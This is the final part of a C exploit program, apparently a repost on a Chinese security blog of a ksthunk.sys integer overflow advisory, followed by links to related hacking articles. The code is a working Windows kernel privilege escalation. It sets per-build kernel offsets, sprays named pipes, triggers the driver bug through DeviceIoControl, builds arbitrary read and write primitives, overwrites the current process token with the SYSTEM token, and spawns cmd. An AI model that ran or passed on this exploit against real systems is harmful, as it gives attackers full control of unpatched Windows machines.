  ReadFile(pipes[overflowidx].r, & dummyvalue, 0x1, & read, 0);
}

/*********  Define Offset Area*******/

// From _EPROCESS
// #define UNIQUEPROCESSIDOFFSET 0x440
// #define ACTIVEPROCESSLINTOFFSET 0x448
// #define TOKENOFFSET 0x4b8
// #define ThreadListHeadOffset 0x5e0

// From _ETHREAD
// Win11
//#define ThreadListEntryOffset 0x538
//#define CIDOffset 0x4c8

// Windows Server 2022
//#define ThreadListEntryOffset 0x538
//#define CIDOffset 0x4c8

// Win10
//#define ThreadListEntryOffset 0x4e8
//#define CIDOffset 0x478

ULONG UNIQUEPROCESSIDOFFSET;
ULONG ACTIVEPROCESSLINTOFFSET;
ULONG TOKENOFFSET;
//ULONG ThreadListHeadOffset;

//ULONG ThreadListEntryOffset;
//ULONG CIDOffset;
ULONG ProcessOffset;
ULONG IrpListOffset;

// FROM _FILE_OBJECT, _DEVICE_OBJECT, _DRIVER_OBJECT
#define DEVICE_OBJECT_OFFSET 0x8
#define DRIVER_OBJECT_OFFSET 0x8
#define DRIVER_START_OFFSET 0x18

// Update by PE parsing
ULONG RtlQueryRegistryValuesEx_Offset;
ULONG PsInitialSystemProcess_Offset;
ULONG IAT_RtlQueryRegistryValuesEx_Offset;

//----------------------------------

VOID CheckVersion() {
  HMODULE hDll = LoadLibrary(TEXT("Ntdll.dll"));
  typedef NTSTATUS(CALLBACK * RTLGETVERSION)(PRTL_OSVERSIONINFOW lpVersionInformation);
  RTLGETVERSION pRtlGetVersion;
  pRtlGetVersion = (RTLGETVERSION) GetProcAddress(hDll, "RtlGetVersion");
  if (pRtlGetVersion) {
    RTL_OSVERSIONINFOW ovi = {
      0
    };
    ovi.dwOSVersionInfoSize = sizeof(ovi);
    NTSTATUS ntStatus = pRtlGetVersion( & ovi);
    if (ntStatus == 0) {
      printf("[*] Version : %d\n", ovi.dwBuildNumber);
      if (ovi.dwBuildNumber > 26000) {
        // Win11 24H2 ??
        UNIQUEPROCESSIDOFFSET = 0x1D0;
        ACTIVEPROCESSLINTOFFSET = 0x1D8;
        TOKENOFFSET = 0x248;
        //ThreadListHeadOffset = 0x370;
        //ThreadListEntryOffset = 0x578;
        //CIDOffset = 0x508;
        ProcessOffset = 0x220;
        IrpListOffset = 0x540;
      } else if (ovi.dwBuildNumber > 22000) {
        // Win11 23H2 ??
        UNIQUEPROCESSIDOFFSET = 0x440;
        ACTIVEPROCESSLINTOFFSET = 0x448;
        TOKENOFFSET = 0x4b8;
        //ThreadListHeadOffset = 0x5e0;
        //ThreadListEntryOffset = 0x538;
        //CIDOffset = 0x4c8;
        ProcessOffset = 0x220;
        IrpListOffset = 0x500;
      } else if (ovi.dwBuildNumber <= 22000 && ovi.dwBuildNumber > 20000) {
        // Server 2022 ??
        UNIQUEPROCESSIDOFFSET = 0x440;
        ACTIVEPROCESSLINTOFFSET = 0x448;
        TOKENOFFSET = 0x4b8;
        //ThreadListHeadOffset = 0x5e0;
        //ThreadListEntryOffset = 0x538;
        //CIDOffset = 0x4c8;
        ProcessOffset = 0x220;
        IrpListOffset = 0x500;
      } else if (ovi.dwBuildNumber <= 20000 && ovi.dwBuildNumber > 19040) {
        // WIN 10, 1904X version 
        UNIQUEPROCESSIDOFFSET = 0x440;
        ACTIVEPROCESSLINTOFFSET = 0x448;
        TOKENOFFSET = 0x4b8;
        //ThreadListHeadOffset = 0x5e0;
        //ThreadListEntryOffset = 0x4e8;
        //CIDOffset = 0x478;
        ProcessOffset = 0x220;
        IrpListOffset = 0x4b0;
      } else {
        printf("Not Supported\n");
        exit(0);
      }
    }
  }
}

/********************  Exploit Helper START!!!!******************/

// Get EPROCESS for current process
ULONG64 PsGetProcessFromPid(DWORD64 pEPROCESS, DWORD pid) {
  LIST_ENTRY64 ActiveProcessLinks;

  ActiveProcessLinks.Flink = (ULONGLONG) readQWORD((DWORD64)(pEPROCESS + ACTIVEPROCESSLINTOFFSET));
  ActiveProcessLinks.Blink = (ULONGLONG) readQWORD((DWORD64)(pEPROCESS + ACTIVEPROCESSLINTOFFSET + 8));

  ULONG64 res = 0;

  while (TRUE) {
    ULONG64 UniqueProcessId = 0;

    // adjust EPROCESS pointer for next entry
    pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - ACTIVEPROCESSLINTOFFSET;
    // get pid
    UniqueProcessId = readQWORD((DWORD64)(pEPROCESS + UNIQUEPROCESSIDOFFSET));
    // is this our pid?
    if (pid == UniqueProcessId) {
      res = pEPROCESS;
      break;
    }
    // get next entry
    ActiveProcessLinks.Flink = (ULONGLONG) readQWORD((DWORD64)(pEPROCESS + ACTIVEPROCESSLINTOFFSET));
    ActiveProcessLinks.Blink = (ULONGLONG) readQWORD((DWORD64)(pEPROCESS + ACTIVEPROCESSLINTOFFSET + 8));
    // if next same as last, we reached the end
    if (pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink) - ACTIVEPROCESSLINTOFFSET)
      break;
  }
  return res;
}

/******************  Exploit Helper END!!!!*****************/

void trigger(HANDLE hDevice) {
  DWORD returnByte;

  //*(GUID*)(inbuffer + 0) = { 0x1d58c920, 0xac9b, 0x11cf, {0xa5, 0xd6, 0x28, 0xdb, 0x04, 0xc1, 0x00, 0x00} };
  *(DWORD64 * )(inbuffer + 0x10) = 0x400000000; // 1 or 2 or 4
  *(DWORD * ) outbuffer = 2; // 1 or 2

  DeviceIoControl(hDevice, 0x2F0007, inbuffer, inputsize, outbuffer, 0xfffffff0, & returnByte, NULL);
}

VOID PrintHex(PBYTE Data, ULONG dwBytes) {
  for (ULONG i = 0; i < dwBytes; i += 16) {
    printf("%.8x: ", i);

    for (ULONG j = 0; j < 16; j++) {
      if (i + j < dwBytes) {
        printf("%.2x ", Data[i + j]);
      } else {
        printf("?? ");
      }
    }

    for (ULONG j = 0; j < 16; j++) {
      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
        printf("%c", Data[i + j]);
      } else {
        printf(".");
      }
    }

    printf("\n");
  }
}

int main(int argc, char ** argv) {
  CheckVersion();
  NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE) GetProcAddress(LoadLibrary(L "ntdll.dll"), "NtFsControlFile");
  pNtWow64WriteVirtualMemory64 NtWow64WriteVirtualMemory64 = (pNtWow64WriteVirtualMemory64) GetProcAddress(GetModuleHandle(L "ntdll.dll"), "NtWow64WriteVirtualMemory64");

  DWORD targetpid = GetCurrentProcessId();
  if (targetpid == 0) {
    return 0;
  }

  // Pipes for Spraying
  for (int i = 0; i < PIPESIZE; i++) {
    CreateSprayPipe( & pipes[i]);
  }
  CreateSprayPipe( & holder);
  LPBYTE DummyBuffer = (LPBYTE) malloc(0x10000);
  memset(DummyBuffer, 0x77, 0x10000);

  inbuffer = (LPBYTE) malloc(inputsize);
  SIZE_T aligned_size = (outputsize + 0xFFF) & 0xFFFFFFFFFFFFF000;
  outbuffer = (LPBYTE) VirtualAlloc((LPVOID) 0x13370000, aligned_size, MEM_COMMIT | MEM_RESERVE, 0x40);
  outbuffer += (aligned_size - outputsize);

  LPBYTE overwrite_data_ptr = outbuffer + 0x1000 - 0x10;

  memset(inbuffer, 0, inputsize);
  memset(outbuffer, 0x41, outputsize);

  #define OOBSIZE 0x4000
  setupoobread(overwrite_data_ptr, OOBSIZE);

  // GUID DeviceGUID = { 0xcf1dda2c, 0x9743, 0x11d0, {0xa3, 0xee, 0x00, 0xa0, 0xc9, 0x22, 0x31, 0x96} };
  GUID DeviceGUID = {
    0x3c0d501a,
    0x140b,
    0x11d1,
    {
      0xb4,
      0x0f,
      0x00,
      0xa0,
      0xc9,
      0x22,
      0x31,
      0x96
    }
  };
  WCHAR DeviceLink[256] = {
    0,
  };
  CM_Get_Device_Interface_ListW( & DeviceGUID, NULL, DeviceLink, 256, CM_GET_DEVICE_INTERFACE_LIST_ALL_DEVICES);

  HANDLE hDevice = CreateFile(
    DeviceLink,
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    0,
    NULL
  );

  printf("[*] hDevice : %p\n", hDevice);
  Sleep(200);
  /*    Create Memory Layout  */

  for (int i = 0; i < PIPESIZE; i++) {
    // size of ETHREAD structure is 0xa00
    WriteDataEntry(pipes[i], DummyBuffer, 0xff0);
    WriteDataEntry(pipes[i], DummyBuffer, 0xff0);
    WriteDataEntry(pipes[i], DummyBuffer, 0xff0);
  }
  ReadDataEntry(pipes[PIPESIZE - 0x80], DummyBuffer, 0xff0);

  trigger(hDevice);
  // Before Start OOB, Holing the Free Space
  WriteDataEntry(holder, DummyBuffer, 0xff0);

  // Step1. OOB Check
  for (int i = 0; i < PIPESIZE; i++) {
    DWORD read = 0;
    PeekNamedPipe(pipes[i].r, DummyBuffer, OOBSIZE, & read, NULL, NULL);
    if (read > OOBSIZE - 0x100) {
      overflowidx = i;
      break;
    }
  }
  printf("[+] gotit : %p\n", overflowidx);
  if (overflowidx == 0) {
    exit(0);
  }

  blink = * (DWORD64 * )(DummyBuffer + 0xfd0);
  flink = * (DWORD64 * )(DummyBuffer + 0xfd8) + 0x1000;

  DWORD64 CCB = blink - 0xa8;
  printf("[*] blink : %llx, flink : %llx, CCB : %llx\n", blink, flink, CCB);

  // Setp2. ARR Setup
  setupaar(overwrite_data_ptr);
  // Release the Area
  ReadDataEntry(holder, DummyBuffer, 0xff0);
  trigger(hDevice);

  // Before Start ARR, Holing the Free Space
  WriteDataEntry(holder, DummyBuffer, 0xff0);

  // Setup IRP
  IO_STATUS_BLOCK isb;
  NtFsControlFile(pipes[overflowidx].w, 0, 0, 0, & isb, 0x119FF8, DummyBuffer, 0x1000, 0, 0);

  // Read IRP
  DWORD64 irpptr = readQWORD(blink + 0x40);
  fakeirp_w = (IRP * ) malloc(0x1000);
  for (int i = 0; i < 0x40; i++) {
    *(DWORD64 * )((LPBYTE) fakeirp_w + i * 8) = readQWORD(irpptr + i * 8);
  }

  //PrintHex((LPBYTE)fakeirp_w, 0x80);

  DWORD64 CurrentThread = * (DWORD64 * )((LPBYTE) fakeirp_w + 0x20);
  DWORD64 CurrentProcess = readQWORD(CurrentThread - IrpListOffset + ProcessOffset);
  printf("[*] CurrentThread : %llx, CurrentThread : %llx\n", CurrentThread, CurrentProcess);

  // Start Traditional Exploit Technique
  DWORD64 SystemProcess = PsGetProcessFromPid(CurrentProcess, 4);
  DWORD64 SystemToken = readQWORD(SystemProcess + TOKENOFFSET);

  printf("[*] SystemProcess : %llx, SystemToken : %llx, CurrentProcess : %llx\n", SystemProcess, SystemToken, CurrentProcess);
  DWORD64 tokendata[2] = {
    0,
    SystemToken
  };

  // STEP3. Setup ARW 
  setuparw(overwrite_data_ptr, CurrentProcess + TOKENOFFSET - 8, tokendata);
  // Release the Area
  ReadDataEntry(holder, DummyBuffer, 0xff0);
  trigger(hDevice);

  DWORD dwread;
  ReadFile(pipes[overflowidx].r, DummyBuffer, 0x1, & dwread, NULL);

  // STEP4. Recover Data
  setuprecoverdata(overwrite_data_ptr, 0xfc0);
  trigger(hDevice);

  Sleep(200);
  system("cmd");
}
```  
  
  
原文地址:  
  
https://ssd-disclosure.com/ssd-advisory-ksthunk-sys-integer-overflow-pe/  
  
往期推荐  
  
  
  
[利用文件建立TCP连接隧道绕过防火墙](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247491318&idx=1&sn=748d214963f18eeddc99249e6ae38d2e&chksm=c1a1ee88f6d6679edf409782d386f1dbe5b45854ab71bf4eafcddc23713e92cb812c92e4a950&scene=21#wechat_redirect)  
  
  
[简化渗透测试整体流程的几个脚本](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247491064&idx=1&sn=eb4dec23b3898b98b65c93b06c829625&chksm=c1a1ed86f6d664906693de196c90c1f7ea0bfd74a40588bd93ca603bdf14f0a5e5e57cf675f3&scene=21#wechat_redirect)  
  
  
[黑客利用ARP协议进行侦查和攻击手法](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247490897&idx=1&sn=0985e7c4054cb0a20b64ea79ce4ecb64&chksm=c1a1ed2ff6d664392900ee0783b2bf47bc34949b83737ba994d66d3787e7e4764275f7288751&scene=21#wechat_redirect)  
  
  
[一款跨平台比VNC更丝滑的远程桌面管理工具](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247491004&idx=1&sn=9e1ea14e1c7180f226796841afac36f5&chksm=c1a1edc2f6d664d42e41d01de33ea5be7609d4c7030b2abba2f9968a9e406361dd7772f31003&scene=21#wechat_redirect)  
  
  
[最受黑客和安全专家青睐的10款搜索引擎](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247490119&idx=1&sn=f08b7c6a174a59c028327cb324a71e67&chksm=c1a1ea39f6d6632f106256f44c268ba195f94d38facc771a6c731e8df5acdb776bcb3ad7ec53&scene=21#wechat_redirect)  
  
  
[八种绕过WAF防火墙的Payload混淆技术](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247490140&idx=1&sn=450bb0e8a3fc6848401702e6acff9293&chksm=c1a1ea22f6d663342a9e545a4235a5e0da50c2fbefe4a298b073bd638de841b51b1733269ab9&scene=21#wechat_redirect)  
  
  
[省时省力的免费好工具-黑客软件集成管家](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247488525&idx=1&sn=61a8232c17c0b58bcb370ba620eaffb2&chksm=c1a1e473f6d66d6568c98cda47c14c87defce6039a5e45523156ba18ceae7e21fbdbb4eb072b&scene=21#wechat_redirect)  
  
  
[2024年最受欢迎的6款黑客专用操作系统](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247487158&idx=1&sn=a0a36434ae2b641c0e601af1343660c4&chksm=c1a1fec8f6d677de1acdca401ef169486a081b099a08a5ae2c5feb4eedfe59eb7db9d28cf7e9&scene=21#wechat_redirect)  
  
  
[黑客在Windows系统下提权的8种主要姿势](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247487903&idx=1&sn=ec535ffa91800e3c5ef48e602c8a0e20&chksm=c1a1e1e1f6d668f7cd82cb29d568934f6bc03f06add680dcb6db5d10bffd9a62f13aab883530&scene=21#wechat_redirect)  
  
  
